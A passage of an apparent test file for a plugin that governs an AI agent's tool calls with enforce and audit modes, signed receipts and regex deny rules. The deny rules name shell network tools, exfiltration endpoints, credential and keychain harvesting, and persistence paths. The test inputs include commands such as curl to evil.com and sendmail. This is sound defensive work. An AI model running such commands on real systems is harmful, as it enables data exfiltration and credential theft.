import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import type { PluginAPI, SannaConfig } from "../src/types.js";
import type { HookDeps } from "../src/hooks.js";

// ---------------------------------------------------------------------------
// Mock @sanna-ai/core
// ---------------------------------------------------------------------------

const mockEvaluateAuthority = vi.fn();
const mockGenerateReceipt = vi.fn();
const mockSignReceipt = vi.fn();
const mockStoreSave = vi.fn();
const mockLoadInvariantChecks = vi.fn();
const mockRunAllInvariantChecks = vi.fn();

// Use the real hash functions — they are pure and deterministic
const { hashObj: realHashObj, hashContent: realHashContent, EMPTY_HASH: realEmptyHash } =
  await vi.importActual<typeof import("@sanna-ai/core")>("@sanna-ai/core");

vi.mock("@sanna-ai/core", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@sanna-ai/core")>();
  return {
    evaluateAuthority: (...args: unknown[]) => mockEvaluateAuthority(...args),
    generateReceipt: (...args: unknown[]) => mockGenerateReceipt(...args),
    signReceipt: (...args: unknown[]) => mockSignReceipt(...args),
    loadInvariantChecks: (...args: unknown[]) => mockLoadInvariantChecks(...args),
    runAllInvariantChecks: (...args: unknown[]) =>
      mockRunAllInvariantChecks(...args),
    ReceiptStore: vi.fn(),
    // Real implementations for hash utilities used by hooks.ts
    hashObj: actual.hashObj,
    hashContent: actual.hashContent,
    EMPTY_HASH: actual.EMPTY_HASH,
  };
});

import { registerHooks } from "../src/hooks.js";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

type HookHandler = (...args: unknown[]) => unknown;

interface MockAPI extends PluginAPI {
  _hooks: Map<string, HookHandler>;
}

function createMockApi(): MockAPI {
  const hooks = new Map<string, HookHandler>();
  return {
    _hooks: hooks,
    registerTool: vi.fn(),
    registerService: vi.fn(),
    registerHook: vi.fn(),
    on(event: string, handler: HookHandler) {
      hooks.set(event, handler);
    },
    registerGatewayMethod: vi.fn(),
    registerCli: vi.fn(),
    config: {},
    logger: {
      info: vi.fn(),
      warn: vi.fn(),
      error: vi.fn(),
    },
  };
}

const ENFORCE_CONFIG: SannaConfig = {
  enforcementMode: "enforce",
  governedTools: ["exec", "write", "browser"],
};

const AUDIT_CONFIG: SannaConfig = {
  enforcementMode: "audit",
  governedTools: ["exec", "write", "browser"],
};

function mockConstitution() {
  return {
    schema_version: "0.1.0",
    identity: { agent_name: "test-agent", domain: "testing", description: "test", extensions: {} },
    provenance: { authored_by: "test", approved_by: [], approval_date: "", approval_method: "", change_history: [], signature: null },
    boundaries: [],
    trust_tiers: { autonomous: [], requires_approval: [], prohibited: [] },
    halt_conditions: [],
    invariants: [],
    policy_hash: "test-hash-abc123",
    authority_boundaries: null,
    trusted_sources: null,
  };
}

function createDeps(overrides?: Partial<HookDeps>): HookDeps {
  return {
    constitution: mockConstitution() as HookDeps["constitution"],
    sink: { store: mockStoreSave } as unknown as HookDeps["sink"],
    privateKey: null,
    ...overrides,
  };
}

/** Call before_tool_call + after_tool_call for an allowed action (completes receipt). */
async function callAllowedAction(
  api: MockAPI,
  toolName: string,
  params: Record<string, unknown> = {},
  result: unknown = { content: [{ type: "text", text: "ok" }] }
) {
  const beforeHook = api._hooks.get("before_tool_call")!;
  const beforeResult = await beforeHook(
    { toolName, params },
    { toolName, agentId: "agent-1", sessionKey: "sess-1" }
  );
  const afterHook = api._hooks.get("after_tool_call")!;
  await afterHook({ toolName, result });
  return beforeResult;
}

beforeEach(() => {
  vi.clearAllMocks();
  // Default: generate receipt returns an object with receipt_id
  mockGenerateReceipt.mockReturnValue({ receipt_id: "r-mock-123" });
  mockSignReceipt.mockImplementation((r: unknown) => r);
  // Default: sink store succeeds (async)
  mockStoreSave.mockResolvedValue({ success: true });
  // Default: no invariant checks defined
  mockLoadInvariantChecks.mockReturnValue([]);
  mockRunAllInvariantChecks.mockReturnValue([]);
});

afterEach(() => {
  vi.restoreAllMocks();
});

// ---------------------------------------------------------------------------
// before_tool_call — primary enforcement
// ---------------------------------------------------------------------------

describe("before_tool_call", () => {
  it("registers three hooks", () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    expect(api._hooks.has("before_tool_call")).toBe(true);
    expect(api._hooks.has("after_tool_call")).toBe(true);
    expect(api._hooks.has("tool_result_persist")).toBe(true);
  });

  it("calls evaluateAuthority with tool name and params", async () => {
    const api = createMockApi();
    const deps = createDeps();
    registerHooks(api, ENFORCE_CONFIG, deps);

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    const hook = api._hooks.get("before_tool_call")!;
    await hook(
      { toolName: "exec", params: { command: "ls" } },
      { toolName: "exec", agentId: "agent-1", sessionKey: "sess-1" }
    );

    expect(mockEvaluateAuthority).toHaveBeenCalledOnce();
    expect(mockEvaluateAuthority).toHaveBeenCalledWith(
      "exec",
      { command: "ls" },
      deps.constitution
    );
  });

  it("returns { blocked: false } when decision is allow", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    const hook = api._hooks.get("before_tool_call")!;
    const result = await hook(
      { toolName: "ls", params: {} },
      { toolName: "ls" }
    );

    expect(result).toEqual({ blocked: false });
  });

  it("returns { block: true } when decision is halt", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "halt",
      reason: "Tool not allowed",
      boundary_type: "cannot_execute",
    });

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "rm", params: {} },
      { toolName: "rm" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Blocked by Sanna governance");
    expect(result.blockReason).toContain("Tool not allowed");
  });

  it("returns { block: true } when decision is escalate", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "escalate",
      reason: "Needs human approval",
      boundary_type: "must_escalate",
    });

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "browser", params: { action: "navigate" } },
      { toolName: "browser" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Sanna requires approval");
    expect(result.blockReason).toContain("Needs human approval");
  });

  it("generates and saves a receipt for every decision", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    await callAllowedAction(api, "exec");

    expect(mockGenerateReceipt).toHaveBeenCalledOnce();
    expect(mockStoreSave).toHaveBeenCalledOnce();
  });

  it("saves receipt for deny decisions too", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "halt",
      reason: "Blocked",
      boundary_type: "cannot_execute",
    });

    const hook = api._hooks.get("before_tool_call")!;
    await hook({ toolName: "rm", params: {} }, { toolName: "rm" });

    expect(mockGenerateReceipt).toHaveBeenCalledOnce();
    expect(mockStoreSave).toHaveBeenCalledOnce();
  });

  it("blocks when evaluation throws (enforce mode, fail closed)", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockImplementation(() => {
      throw new Error("evaluation error");
    });

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "exec", params: {} },
      { toolName: "exec" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("evaluation failed");
  });

  it("blocks when receipt persistence fails for halt (enforce mode)", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "halt",
      reason: "Blocked",
      boundary_type: "cannot_execute",
    });
    mockGenerateReceipt.mockImplementation(() => {
      throw new Error("DB write failed");
    });

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "exec", params: {} },
      { toolName: "exec" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("receipt persistence failed");
  });

  it("does not block in audit mode on deny", async () => {
    const api = createMockApi();
    registerHooks(api, AUDIT_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "halt",
      reason: "Not allowed",
      boundary_type: "cannot_execute",
    });

    const hook = api._hooks.get("before_tool_call")!;
    const result = await hook(
      { toolName: "rm", params: {} },
      { toolName: "rm" }
    );

    expect(result).toBeUndefined();
    expect(api.logger.warn).toHaveBeenCalledWith(
      expect.stringContaining("DENY rm")
    );
  });

  it("does not block in audit mode when evaluation throws", async () => {
    const api = createMockApi();
    registerHooks(api, AUDIT_CONFIG, createDeps());

    mockEvaluateAuthority.mockImplementation(() => {
      throw new Error("evaluation error");
    });

    const hook = api._hooks.get("before_tool_call")!;
    const result = await hook(
      { toolName: "exec", params: {} },
      { toolName: "exec" }
    );

    expect(result).toBeUndefined();
    expect(api.logger.error).toHaveBeenCalledWith(
      expect.stringContaining("evaluation error")
    );
  });

  it("blocks when toolName cannot be extracted (enforce mode)", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { noToolName: true },
      {}
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("could not identify tool");
  });

  it("allows when toolName cannot be extracted (audit mode)", async () => {
    const api = createMockApi();
    registerHooks(api, AUDIT_CONFIG, createDeps());

    const hook = api._hooks.get("before_tool_call")!;
    const result = await hook({ noToolName: true }, {});

    expect(result).toBeUndefined();
  });

  it("includes receipt ID in block reason", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "halt",
      reason: "Forbidden",
      boundary_type: "cannot_execute",
    });
    mockGenerateReceipt.mockReturnValue({ receipt_id: "receipt-abc-123" });

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "rm", params: {} },
      { toolName: "rm" }
    )) as Record<string, unknown>;

    expect(result.blockReason).toContain("receipt-abc-123");
  });

  it("logs ALLOW with pending receipt info", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    const hook = api._hooks.get("before_tool_call")!;
    await hook({ toolName: "ls", params: {} }, { toolName: "ls" });

    expect(api.logger.info).toHaveBeenCalledWith(
      expect.stringContaining("ALLOW ls")
    );
    expect(api.logger.info).toHaveBeenCalledWith(
      expect.stringContaining("pending receipt")
    );
  });

  it("signs receipt when privateKey is provided", async () => {
    const api = createMockApi();
    const fakeKey = {} as HookDeps["privateKey"];
    registerHooks(api, ENFORCE_CONFIG, createDeps({ privateKey: fakeKey }));

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    await callAllowedAction(api, "exec");

    expect(mockSignReceipt).toHaveBeenCalledOnce();
    expect(mockSignReceipt).toHaveBeenCalledWith(
      expect.anything(),
      fakeKey,
      "sanna-openclaw"
    );
  });
});

// ---------------------------------------------------------------------------
// checks and evaluation_coverage
// ---------------------------------------------------------------------------

describe("checks and evaluation_coverage", () => {
  it("authority decision appears as CheckResult in receipt checks array", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    await callAllowedAction(api, "exec");

    const receiptArgs = mockGenerateReceipt.mock.calls[0][0] as Record<
      string,
      unknown
    >;
    const checks = receiptArgs.checks as Array<Record<string, unknown>>;
    expect(checks).toBeDefined();
    const authority = checks.find((c) => c.check_id === "AUTHORITY");
    expect(authority).toBeDefined();
    expect(authority!.passed).toBe(true);
    expect(authority!.name).toBe("Authority Boundary Evaluation");
    expect(authority!.severity).toBe("info");
    expect(authority!.status).toBe(null);
    expect(authority!.evidence).toBe("can_execute: Permitted");
  });

  it("authority deny appears as failed CheckResult", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "halt",
      reason: "Tool not allowed",
      boundary_type: "cannot_execute",
    });

    const hook = api._hooks.get("before_tool_call")!;
    await hook({ toolName: "rm", params: {} }, { toolName: "rm" });

    const receiptArgs = mockGenerateReceipt.mock.calls[0][0] as Record<
      string,
      unknown
    >;
    const checks = receiptArgs.checks as Array<Record<string, unknown>>;
    const authority = checks.find((c) => c.check_id === "AUTHORITY");
    expect(authority).toBeDefined();
    expect(authority!.passed).toBe(false);
    expect(authority!.severity).toBe("critical");
  });

  it("constitution invariants run on tool params", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue([
      { id: "INV-001", type: "pattern", params: {} },
    ]);
    mockRunAllInvariantChecks.mockReturnValue([
      {
        check_id: "INV-001",
        name: "Pattern check",
        passed: true,
        severity: "info",
        evidence: "no match",
      },
    ]);

    await callAllowedAction(api, "exec", { command: "ls" });

    expect(mockRunAllInvariantChecks).toHaveBeenCalledOnce();

    const receiptArgs = mockGenerateReceipt.mock.calls[0][0] as Record<
      string,
      unknown
    >;
    const checks = receiptArgs.checks as Array<Record<string, unknown>>;
    expect(checks).toHaveLength(2);
    expect(checks[0].check_id).toBe("AUTHORITY");
    expect(checks[1].check_id).toBe("INV-001");
  });

  it("invariant check error blocks in enforce mode (fail closed)", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockImplementation(() => {
      throw new Error("invariant load failed");
    });

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "exec", params: {} },
      { toolName: "exec" }
    )) as Record<string, unknown>;

    // Enforce mode must block when invariant evaluation fails
    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Invariant evaluation failed");

    // Receipt should include the INVARIANT_ERROR check
    expect(mockGenerateReceipt).toHaveBeenCalledOnce();
    const receiptArgs = mockGenerateReceipt.mock.calls[0][0] as Record<
      string,
      unknown
    >;
    const checks = receiptArgs.checks as Array<Record<string, unknown>>;
    const errorCheck = checks.find((c) => c.check_id === "INVARIANT_ERROR");
    expect(errorCheck).toBeDefined();
    expect(errorCheck!.passed).toBe(false);
    expect(errorCheck!.status).toBe("ERROR");
  });

  it("invariant check error does not block in audit mode", async () => {
    const api = createMockApi();
    registerHooks(api, AUDIT_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockImplementation(() => {
      throw new Error("invariant load failed");
    });

    const hook = api._hooks.get("before_tool_call")!;
    const result = await hook(
      { toolName: "exec", params: {} },
      { toolName: "exec" }
    );

    // Audit mode should still allow
    expect(result).toEqual({ blocked: false });

    // Complete the allowed action to generate receipt
    const afterHook = api._hooks.get("after_tool_call")!;
    await afterHook({ toolName: "exec", result: { ok: true } });

    expect(mockGenerateReceipt).toHaveBeenCalledOnce();
    const receiptArgs = mockGenerateReceipt.mock.calls[0][0] as Record<
      string,
      unknown
    >;
    const checks = receiptArgs.checks as Array<Record<string, unknown>>;
    expect(checks).toHaveLength(1);
    expect(checks[0].check_id).toBe("AUTHORITY");
  });

  it("evaluation_coverage is populated", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue([
      { id: "INV-001", type: "pattern", params: {} },
    ]);
    mockRunAllInvariantChecks.mockReturnValue([
      {
        check_id: "INV-001",
        passed: false,
        severity: "high",
        evidence: "match found",
      },
    ]);

    await callAllowedAction(api, "exec");

    const receiptArgs = mockGenerateReceipt.mock.calls[0][0] as Record<
      string,
      unknown
    >;
    const coverage = receiptArgs.evaluation_coverage as Record<
      string,
      unknown
    >;
    expect(coverage).toBeDefined();
    expect(coverage.total_invariants).toBe(2);
    expect(coverage.evaluated).toBe(2);
    expect(coverage.not_checked).toBe(0);
    expect(coverage.coverage_basis_points).toBe(10000);
  });

  it("empty invariant list produces authority-only receipt", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue([]);

    await callAllowedAction(api, "exec");

    expect(mockRunAllInvariantChecks).not.toHaveBeenCalled();

    const receiptArgs = mockGenerateReceipt.mock.calls[0][0] as Record<
      string,
      unknown
    >;
    const checks = receiptArgs.checks as Array<Record<string, unknown>>;
    expect(checks).toHaveLength(1);
    expect(checks[0].check_id).toBe("AUTHORITY");
  });

  it("invariant check failure changes receipt status", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue([
      { id: "INV-002", type: "pattern", params: {} },
    ]);
    mockRunAllInvariantChecks.mockReturnValue([
      {
        check_id: "INV-002",
        name: "Dangerous pattern",
        passed: false,
        severity: "high",
        evidence: "matched dangerous pattern",
      },
    ]);

    await callAllowedAction(api, "exec");

    const receiptArgs = mockGenerateReceipt.mock.calls[0][0] as Record<
      string,
      unknown
    >;
    const checks = receiptArgs.checks as Array<Record<string, unknown>>;
    expect(checks).toHaveLength(2);
    const failedCheck = checks.find((c) => c.check_id === "INV-002");
    expect(failedCheck).toBeDefined();
    expect(failedCheck!.passed).toBe(false);
    expect(failedCheck!.severity).toBe("high");
    expect(failedCheck!.evidence).toBe("matched dangerous pattern");
  });

  it("escalate decision produces failed authority check", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "escalate",
      reason: "Needs human approval",
      boundary_type: "must_escalate",
    });

    const hook = api._hooks.get("before_tool_call")!;
    await hook(
      { toolName: "browser", params: { action: "navigate" } },
      { toolName: "browser" }
    );

    const receiptArgs = mockGenerateReceipt.mock.calls[0][0] as Record<
      string,
      unknown
    >;
    const checks = receiptArgs.checks as Array<Record<string, unknown>>;
    const authority = checks.find((c) => c.check_id === "AUTHORITY");
    expect(authority).toBeDefined();
    expect(authority!.passed).toBe(false);
    expect(authority!.severity).toBe("critical");
    expect(authority!.status).toBe("FAILED");
    expect(authority!.evidence).toBe("must_escalate: Needs human approval");
  });
});

// ---------------------------------------------------------------------------
// invariant escalation bypass prevention
// ---------------------------------------------------------------------------

// Invariant definitions with actual regex_deny rules from constitutions
const COMMS_INVARIANT_DEFS_WITH_RULES = [
  {
    id: "INV_NO_EXTERNAL_COMMS_VIA_EXEC",
    rule: "regex_deny pattern: /\\b(curl|wget|sendmail|mail\\b|smtp|nc\\b|ncat|netcat|telnet|ssh|scp|sftp|rsync)\\b/i",
    enforcement: "halt",
    type: "regex_deny",
    description: "Block network/messaging commands routed through exec to prevent message escalation bypass",
    applies_to: ["exec", "bash", "browser"],
  },
  {
    id: "INV_NO_HTTP_REQUESTS_VIA_EXEC",
    rule: "regex_deny pattern: /\\b(https?:\\/\\/|fetch\\(|requests\\.|urllib|http\\.client|smtplib|socket\\.connect)\\b|\\/\\/[a-zA-Z]/i",
    enforcement: "halt",
    type: "regex_deny",
    description: "Block HTTP requests and socket connections through exec",
  },
  {
    id: "INV_NO_SCRIPTED_OUTBOUND",
    rule: "regex_deny pattern: /\\b(python[23]?\\s+-c|node\\s+-e|ruby\\s+-e|perl\\s+-e)\\b.*\\b(http|smtp|mail|socket|fetch|request)\\b/i",
    enforcement: "halt",
    type: "regex_deny",
    description: "Block inline scripts that make outbound connections",
  },
  {
    id: "INV_NO_APPLESCRIPT_OUTBOUND",
    rule: "regex_deny pattern: /\\b(osascript|applescript|tell\\s+application)\\b/i",
    enforcement: "halt",
    type: "regex_deny",
    description: "Block AppleScript execution that could trigger external applications",
  },
  {
    id: "INV_NO_APP_LAUNCH_VIA_EXEC",
    rule: "regex_deny pattern: /\\b(open\\s+mailto|open\\s+-a|xdg-open|start\\s+\\/|cscript|wscript)\\b/i",
    enforcement: "halt",
    type: "regex_deny",
    description: "Block launching external applications or mailto links through exec",
  },
  {
    id: "INV_NO_EXFIL_VIA_FETCH",
    rule: "regex_deny pattern: /\\b(webhook\\.site|requestbin|pipedream\\.net|hookbin|burpcollaborator|interact\\.sh|canarytokens|ngrok\\.io|localtunnel)\\b/i",
    enforcement: "halt",
    type: "regex_deny",
    description: "Block web_fetch requests to known data exfiltration endpoints",
    applies_to: ["exec", "bash", "web_fetch", "web_search", "browser"],
  },
  {
    id: "INV_NO_DNS_EXFILTRATION",
    rule: "regex_deny pattern: /\\b(nslookup|dig\\s|host\\s)\\b/i",
    enforcement: "halt",
    type: "regex_deny",
    description: "Block DNS lookup commands that could exfiltrate data via hostname encoding",
  },
  {
    id: "INV_NO_BASH_TCP",
    rule: "regex_deny pattern: /\\/dev\\/(tcp|udp)\\//i",
    enforcement: "halt",
    type: "regex_deny",
    description: "Block bash built-in TCP/UDP connections via /dev/tcp and /dev/udp",
  },
  {
    id: "INV_NO_ENCODED_EXEC",
    rule: "regex_deny pattern: /\\b(base64|atob|decode)\\b.*\\b(exec|eval|system|popen|subprocess)\\b|\\b(exec|eval|system|popen|subprocess)\\b.*\\b(base64|atob|decode)\\b/i",
    enforcement: "halt",
    type: "regex_deny",
    description: "Block encoded payload execution that hides blocked operations behind encoding",
  },
  {
    id: "INV_NO_PERSISTENCE_WRITE",
    rule: "regex_deny pattern: /\\b(LaunchAgents|LaunchDaemons|cron\\.d|crontab|systemd|init\\.d|autostart|startup)\\b|\\.(?:zshrc|bashrc|bash_profile|profile|zprofile)\\b/i",
    enforcement: "halt",
    type: "regex_deny",
    description: "Block writes to persistence mechanisms that execute on login or boot",
    applies_to: ["exec", "bash", "write"],
  },
  {
    id: "INV_ESCALATE_DESTRUCTIVE_OPS",
    rule: "regex_deny pattern: /\\brm\\b.*(-r\\b.*-f\\b|-f\\b.*-r\\b|--recursive|--force|-rf\\b|-fr\\b)/i",
    enforcement: "warn",
    type: "regex_deny",
    description: "Escalate recursive/forced deletion commands regardless of flag ordering",
  },
  {
    id: "INV_NO_CREDENTIAL_HARVESTING",
    rule: "regex_deny pattern: /\\b(find|locate|grep|rg|ag|printenv)\\b.*(\\.env|\\.pem|\\.key|secret|credential|password|authorized_keys|api.?key|smtp|sendgrid|resend|postmark)/i",
    enforcement: "halt",
    type: "regex_deny",
    description: "Block credential hunting commands that search for sensitive files",
  },
  {
    id: "INV_NO_KEYCHAIN_ACCESS",
    rule: "regex_deny pattern: /\\bsecurity\\s+(find-generic-password|find-internet-password|dump-keychain)\\b/i",
    enforcement: "halt",
    type: "regex_deny",
    description: "Block macOS keychain credential extraction via security CLI",
  },
  {
    id: "INV_ESCALATE_SCRIPT_EXEC",
    rule: "regex_deny pattern: /\\b(python[23]?|node|ruby|perl|bash|sh|zsh)\\s+\\S+\\.(py|js|rb|pl|sh|zsh)\\b/i",
    enforcement: "warn",
    type: "regex_deny",
    description: "Escalate execution of script files through exec for review",
  },
];

// Core returns UNKNOWN_TYPE for regex_deny rules it can't evaluate
function unknownTypeResults() {
  return COMMS_INVARIANT_DEFS_WITH_RULES.map((d) => ({
    check_id: d.id,
    passed: false,
    status: "UNKNOWN_TYPE",
    severity: "critical",
    evidence: null,
  }));
}

describe("invariant escalation bypass prevention", () => {
  it("exec with sendmail in params is HALTED by invariant", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "exec", params: { command: "sendmail nic@sanna.dev" } },
      { toolName: "exec" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Block network/messaging commands");

    const receiptArgs = mockGenerateReceipt.mock.calls[0][0] as Record<
      string,
      unknown
    >;
    const checks = receiptArgs.checks as Array<Record<string, unknown>>;
    const failed = checks.find(
      (c) => c.check_id === "INV_NO_EXTERNAL_COMMS_VIA_EXEC"
    );
    expect(failed).toBeDefined();
    expect(failed!.passed).toBe(false);
    expect(failed!.status).toBe("FAILED");
    expect(failed!.evidence).toContain("sendmail");
  });

  it("exec with curl is HALTED by invariant", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "exec", params: { command: "curl https://evil.com" } },
      { toolName: "exec" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Block network/messaging commands");
  });

  it("exec with python smtplib is HALTED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "exec", params: { command: "python -c 'import smtplib'" } },
      { toolName: "exec" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Block HTTP requests and socket connections");
  });

  it("exec with ls -la passes invariants, verdict ALLOW", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const result = await callAllowedAction(api, "exec", { command: "ls -la" });

    expect(result).toEqual({ blocked: false });

    const receiptArgs = mockGenerateReceipt.mock.calls[0][0] as Record<
      string,
      unknown
    >;
    const checks = receiptArgs.checks as Array<Record<string, unknown>>;
    // All invariant checks should pass (regex didn't match)
    for (const check of checks) {
      expect(check.passed).toBe(true);
    }
  });

  it("write tool with https URL in content stays ALLOW", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    // Core returns UNKNOWN_TYPE for all regex_deny rules
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = await hook(
      {
        toolName: "write",
        params: {
          path: "/tmp/readme.md",
          content: "Visit https://example.com for docs",
        },
      },
      { toolName: "write" }
    );

    // Write tool runs regex eval but exec-specific invariants default to
    // applies_to: ["exec","bash"] so they don't match here
    expect(result).toEqual({ blocked: false });
  });

  it("exec with osascript is HALTED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "exec", params: { command: "osascript -e 'tell application \"Finder\" to empty trash'" } },
      { toolName: "exec" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Block AppleScript execution");
  });

  it("exec with open mailto is HALTED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "exec", params: { command: "open mailto:someone@example.com" } },
      { toolName: "exec" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Block launching external applications");
  });

  it("exec with open -a is HALTED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
